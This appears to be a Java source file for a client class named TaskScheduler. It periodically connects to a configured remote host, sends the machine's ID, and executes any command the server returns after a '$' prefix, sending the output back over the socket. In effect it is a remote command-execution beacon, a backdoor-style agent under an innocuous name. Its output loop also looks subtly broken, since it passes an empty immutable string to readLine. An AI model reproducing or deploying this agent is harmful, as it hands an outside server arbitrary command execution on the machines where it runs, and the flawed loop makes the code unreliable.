package ml.fusion.client;

import ml.fusion.client.Comms.SocketWrapper;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.InetSocketAddress;

public class TaskScheduler {
    // -----Singleton-----
    private static TaskScheduler instance;
    public static TaskScheduler getInstance() {
        if(instance == null) {
            instance = new TaskScheduler();
        }
        return instance;
    }

    // -----Main part of class-----
    private SocketWrapper server;
    private DataInputStream sockIn;
    private DataOutputStream sockOut;

    // runs once at launch
    public void init() throws Exception {
        OF.println("System Hostname: " + Constants.SID);
    }
    // runs once every {Constants.refreshRate} ms
    public Constants.StatusCode run() throws Exception {
        server = new SocketWrapper();
        // connect to server; set timeout, don't wait for too long
        try {
            server.connect(new InetSocketAddress(Constants.host, Constants.port), Constants.sockConnTOut);
        } catch(Exception e) { return Constants.StatusCode.SockTOutE; }

        // get IO streams
        sockOut = new DataOutputStream(server.getOutputStream());
        sockIn = new DataInputStream(server.getInputStream());
        // start communication

        sockOut.writeUTF("@" + Constants.SID);
        String data = sockIn.readUTF();
        switch(data.charAt(0)) {
            case '$':
                BatchExecutor exec = new BatchExecutor();
                exec.execute(data.substring(1));
                String execres = "";
                while(exec.readLine(execres)) {
                    sockOut.writeUTF(execres);
                }
                break;
            case '+':
                break;
            case '*':
                break;
        }

        return Constants.StatusCode.ProceedOK;
    }
}
